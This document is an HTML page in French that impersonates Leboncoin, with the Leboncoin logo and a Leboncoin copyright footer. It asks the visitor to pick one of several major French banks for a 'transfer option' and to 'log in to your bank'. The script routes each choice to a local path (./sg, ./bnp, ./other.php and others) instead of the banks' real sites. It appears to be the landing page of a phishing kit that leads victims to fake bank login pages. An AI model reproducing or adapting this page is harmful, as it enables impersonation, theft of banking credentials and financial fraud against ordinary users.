<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sélection de Banque</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #fff;
            color: #333;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            background-color: #FFFFFF;
            padding: 15px;
            display: flex;
            justify-content: center; /* Centrer le logo */
            align-items: center;
            flex-wrap: wrap;
        }

        header img {
            height: 50px;
        }

        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            padding: 20px;
            max-width: 100%;
            width: 100%;
        }

        .content-box {
            width: 100%;
            max-width: 600px;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
            text-align: center;
            margin-bottom: 40px;
        }

        h1 {
            font-size: 24px;
            color: #ff5733;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
        }

        .bank-selection {
            margin-bottom: 30px;
        }

        select {
            padding: 12px;
            font-size: 16px;
            border: 2px solid #ff5733;
            border-radius: 5px;
            background-color: #fff8e7;
            color: #333;
            width: 100%;
            max-width: 300px;
        }

        .bank-image {
            display: none;
            margin-top: 20px;
        }

        .bank-image img {
            max-width: 150px;
            margin-bottom: 20px;
            width: 100%;
            height: auto;
        }

        .connect-message {
            font-size: 18px;
            color: #555;
            margin-bottom: 15px;
        }

        .connect-button {
            background-color: #ff5733;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .connect-button:hover {
            background-color: #ff8c00;
        }

        footer {
            background-color: #333;
            color: white;
            text-align: center;
            padding: 15px 0;
            font-size: 14px;
            flex-shrink: 0;
        }

        footer p {
            font-size: 14px;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 20px;
            }
            
            select {
                font-size: 14px;
                padding: 10px;
            }

            .connect-button {
                font-size: 14px;
                padding: 10px 16px;
            }

            .bank-image img {
                max-width: 120px;
            }

            header img {
                height: 40px;
            }
        }

        @media (max-width: 480px) {
            header img {
                height: 35px;
            }

            .connect-button {
                font-size: 12px;
                padding: 8px 14px;
            }

            .bank-image img {
                max-width: 100px;
            }

            h1 {
                font-size: 18px;
            }

            h2 {
                font-size: 16px;
            }

            select {
                font-size: 12px;
                padding: 8px;
            }
        }
    </style>
</head>
<body>

    <!-- Barre de menu avec logo centré -->
    <header>
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/63/Leboncoin_Logo_%282016%29.svg" alt="Logo">
    </header>

    <!-- Contenu principal -->
    <div class="container">
        <div class="content-box">
            <h1>SÉLECTIONNEZ VOTRE BANQUE</h1>
            
            <!-- Entête ajoutée -->
            <h2>OPTION DE TRANSFERT</h2>

            <div class="bank-selection">
                <select id="bankSelect" onchange="showBank()">
                    <option value="">CHOISIR VOTRE BANQUE</option>
                    <option value="bank1">SOCIÉTÉ GÉNÉRALE</option> 
                    <option value="bank2">BANQUE POSTALE</option>
                    <option value="bank3">CRÉDIT AGRICOLE</option>
                    <option value="bank4">CAISSE D'ÉPARGNE</option>
                    <option value="bank5">BNP PARIBAS</option>
                    <option value="bank6">LCL BANQUE</option>
                    <option value="bank7">CRÉDIT MUTUEL</option>
                    <option value="bank8">BANQUE POPULAIRE</option>
                    <option value="bank9">BOURSORAMA</option>
                    <option value="bank10">HELLO BANK</option>
                    <option value="bank11">CIC BANQUE</option>
                    <option value="bank12">AUTRE BANQUE</option>

                </select>
            </div>

            <div class="bank-image" id="bankImage">
                <img id="selectedBankImage" src="" alt="Image Banque">
                <p class="connect-message">Veuillez vous connecter à votre banque</p>
                <button class="connect-button" onclick="connectBank()">Se connecter</button>
            </div>
        </div>
    </div>

    <!-- Pied de page -->
    <footer>
        <p>&copy; Leboncoin 2006 - 2024 - Tous droits réservés</p>
    </footer>

    <script>
        function showBank() {
            var select = document.getElementById('bankSelect');
            var imageDiv = document.getElementById('bankImage');
            var selectedImage = document.getElementById('selectedBankImage');
            
            if (select.value) {
                var bankImages = {
                    'bank1': './images/sg.svg',
                    'bank2': './images/banquepostal.svg',
                    'bank3': './images/creditagr.svg',
                    'bank4': './images/caisse.webp',
                    'bank5': './images/bnp.png',
                    'bank6': './images/lcl.svg',
                    'bank7': './images/creditmutuel.svg',
                    'bank8': './images/bpopulaire.png',
                    'bank9': './images/bourso.svg',
                    'bank10': './images/hellobank.png',
                    'bank11': './images/cic.svg',
                    'bank12': './images/autre.png'
                };
                
                selectedImage.src = bankImages[select.value];
                imageDiv.style.display = 'block';
            } else {
                imageDiv.style.display = 'none';
            }
        }

        function connectBank() {
            var select = document.getElementById('bankSelect');
            var bankLinks = {
                'bank1': './sg',
                'bank2': './bp',
                'bank3': './ca',
                'bank4': './ce',
                'bank5': './bnp',
                'bank6': './lcl',
                'bank7': './cm',
                'bank8': './bpl',
                'bank9': './bourso',
                'bank10': './hello',
                'bank11': './cic',
                'bank12': './other.php'
            };

            if (select.value) {
                window.location.href = bankLinks[select.value];
            } else {
                alert('Veuillez sélectionner une banque.');
            }
        }
    </script>

</body>
</html>
